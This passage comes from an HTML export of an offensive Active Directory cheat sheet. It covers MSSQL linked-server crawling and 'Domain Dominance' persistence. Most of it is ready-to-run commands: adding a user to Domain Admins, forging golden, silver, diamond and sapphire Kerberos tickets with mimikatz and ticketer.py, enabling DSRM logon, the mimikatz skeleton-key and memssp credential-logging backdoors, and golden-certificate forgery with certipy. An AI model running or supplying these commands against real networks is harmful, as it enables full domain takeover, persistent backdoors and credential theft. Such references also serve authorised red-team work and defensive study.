class='title level-3'>Mssql links</h1><br/><p># Trusts</p><p>## Mssql links &gt;&gt;&gt; MSSQL [<a href="#Domain_Dominance--Lateral_Movement--MSSQL_1092.html">MSSQL</a>]</p><p></p><p>MSSQL trusted links doesn&#39;t care of trust link</p><p>&gt;&gt;	Get-SQLServerLinkCrawl -username &lt;user&gt; -password &lt;pass&gt; -Verbose -Instance &lt;sql_instance&gt;`</p><p>&gt;&gt;	mssqlclient.py -windows-auth &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;`</p><p>	&gt;&gt;	trustlink</p><p>		&gt;&gt;	sp_linkedservers</p><p>			&gt;&gt;	use_link</p></div><div class='page'><a name="Domain_Dominance--Persistence_982.html"></a><h1 class='title level-2'>Persistence</h1><br/><p><ul><li><code>net group &quot;domain admins&quot; myuser /add /domain</code></li></ul></p><p> • <strong>Intent:</strong> Add account to DA group.</p><p> • <strong>Purpose:</strong> Maintain DA persistence.</p><p><ul><li>Golden ticket (ticketer, mimikatz)</li></ul></p><p> • <strong>Intent:</strong> Forge TGT with krbtgt key.</p><p> • <strong>Purpose:</strong> Infinite DA access.</p><p><ul><li>Silver ticket</li></ul></p><p> • <strong>Intent:</strong> Forge TGS with service key.</p><p> • <strong>Purpose:</strong> Persist service-level admin.</p><p><ul><li>DSRM key reg edit</li></ul></p><p> • <strong>Intent:</strong> Enable DC DSRM login.</p><p> • <strong>Purpose:</strong> Persist DA backdoor.</p><p><ul><li>Skeleton key (mimikatz misc::skeleton)</li></ul></p><p> • <strong>Intent:</strong> Patch LSASS with master pass.</p><p> • <strong>Purpose:</strong> Backdoor all auth.</p><p><ul><li>Custom SSP (memssp)</li></ul></p><p> • <strong>Intent:</strong> Log creds via SSP injection.</p><p> • <strong>Purpose:</strong> Stealthy persistence.</p><p><ul><li>Golden certificate (<code>certipy ca backup + forge</code>)</li></ul></p><p> • <strong>Intent:</strong> Abuse CA private key to mint certs.</p><p> • <strong>Purpose:</strong> DA persistence with PKI.</p><p><ul><li>Diamond ticket</li></ul></p><p> • <strong>Intent:</strong> Forge TGT with multiple SIDs/groups.</p><p> • <strong>Purpose:</strong> Cross-domain persistence.</p><p><ul><li>Sapphire ticket</li></ul></p><p> • <strong>Intent:</strong> Similar to diamond, impersonate arbitrary users.</p><p> • <strong>Purpose:</strong> Maintain stealthy access.</p><p><ul><li>DC shadow / ACL manipulation</li></ul></p><p> • <strong>Intent:</strong> Push rogue DC objects or alter ACLs.</p><p> • <strong>Purpose:</strong> Long-term persistence.</p><p></p></div><div class='page'><a name="Domain_Dominance--Persistence--ADD_DA_1100.html"></a><h1 class='title level-3'>ADD DA</h1><br/><p># Persistence</p><p>## ADD DA</p><p></p><p>net group &quot;domain admins&quot; myuser /add /domain</p></div><div class='page'><a name="Domain_Dominance--Persistence--Golden_ticket_1101.html"></a><h1 class='title level-3'>Golden ticket</h1><br/><p># Persistence</p><p>## Golden ticket</p><p></p><p>ticketer.py -aesKey &lt;aeskey&gt; -domain-sid &lt;domain_sid&gt; -domain &lt;domain&gt; &lt;anyuser&gt;</p><p></p><p>mimikatz &quot;kerberos::golden /user:&lt;admin_user&gt; /domain:&lt;domain&gt; /sid:&lt;domain-sid&gt;/aes256:&lt;krbtgt_aes256&gt; /ptt&quot;</p></div><div class='page'><a name="Domain_Dominance--Persistence--Silver_Ticket_1103.html"></a><h1 class='title level-3'>Silver Ticket</h1><br/><p># Persistence</p><p>## Silver Ticket</p><p></p><p>mimikatz &quot;kerberos::golden /sid:&lt;current_user_sid&gt; /domain:&lt;domain-sid&gt; /target:&lt;target_server&gt; /service:&lt;target_service&gt; /aes256:&lt;computer_aes256_key&gt; /user:&lt;any_user&gt; /ptt&quot;</p><p></p><p>ticketer.py -nthash &lt;machine_nt_hash&gt; -domain-sid &lt;domain_sid&gt; -domain &lt;domain&gt; &lt;anyuser&gt;</p></div><div class='page'><a name="Domain_Dominance--Persistence--Directory_Service_Restore_Mode_(DSRM)_1104.html"></a><h1 class='title level-3'>Directory Service Restore Mode (DSRM)</h1><br/><p># Persistence</p><p></p><p># Directory Service Restore Mode (DSRM)</p><p></p><p>PowerShell New-ItemProperty &quot;HKLM:\System\CurrentControlSet\Control\Lsa\&quot; -Name &quot;DsrmAdminLogonBehavior&quot; -Value 2 -PropertyType DWORD</p></div><div class='page'><a name="Domain_Dominance--Persistence--Skeleton_Key_1105.html"></a><h1 class='title level-3'>Skeleton Key</h1><br/><p># Persistence</p><p>## Skeleton Key</p><p></p><p>mimikatz &quot;privilege::debug&quot; &quot;misc::skeleton&quot; &quot;exit&quot; #password is mimikatz</p></div><div class='page'><a name="Domain_Dominance--Persistence--Custom_SSP_1106.html"></a><h1 class='title level-3'>Custom SSP</h1><br/><p># Persistence</p><p>## Custom SSP</p><p></p><p>mimikatz &quot;privilege::debug&quot; &quot;misc::memssp&quot; &quot;exit&quot;</p><p>&gt;&gt;	C:\Windows\System32\kiwissp.log</p></div><div class='page'><a name="Domain_Dominance--Persistence--Golden_certificate_1107.html"></a><h1 class='title level-3'>Golden certificate</h1><br/><p># Persistence</p><p>## Golden certificate</p><p></p><p>certipy ca -backup -ca &#39;&lt;ca_name&gt;&#39; -username &lt;user&gt;@&lt;domain&gt; -hashes &lt;hash&gt;</p><p>&gt;&gt;	certipy forge -ca-pfx &lt;ca_private_key&gt; -upn &lt;user&gt;@&lt;domain&gt; -subject &#39;CN=&lt;user&gt;,CN=Users,DC=&lt;CORP&gt;,DC=&lt;LOCAL&gt;</p></div><div class='page'><a name="Domain_Dominance--Persistence--Diamond_ticket_1108.html"></a><h1 class='title level-3'>Diamond ticket</h1><br/><p># Persistence</p><p>## Diamond ticket</p><p></p><p>ticketer.py -request -domain &lt;domain&gt; -user &lt;user&gt; -password &lt;password&gt; -nthash &lt;hash&gt; -aesKey &lt;aeskey&gt; -domain-sid &lt;domain_sid&gt;  -user-id &lt;user_id&gt; -groups &#39;512,513,518,519,520&#39; &lt;anyuser&gt;</p></div><div class='page'><a name="Domain_Dominance--Persistence--Saphire_Ticket_1109.html"></a><h1 class='title level-3'>Saphire Ticket</h1><br/><p># Persistence</p><p>## Saphire Ticket</p><p></p><p>ticketer.py -request -impersonate &lt;anyuser&gt; -domain &lt;domain&gt; -user &lt;user&gt; -password &lt;password&gt;  -nthash &lt;hash&gt; -aesKey &lt;aeskey&gt; -domain-sid &lt;domain_sid&gt;  &#39;ignored&#39;</p><p></p></div><div class='page'><a name="Domain_Dominance--Persistence--DC_shadow_1110.html"></a><h1 class='title level-3'>DC shadow</h1><br/><p># Persistence</p><p>## DC shadow</p></div><div class='page'><a name="Domain_Dominance--Persistence--ACL_manipulation_1269.html"></a><h1 class='title level-3'>ACL manipulation</h1><br/><p># Persistence</p><p>## ACL manipulation</p></div>
</body>
</html>
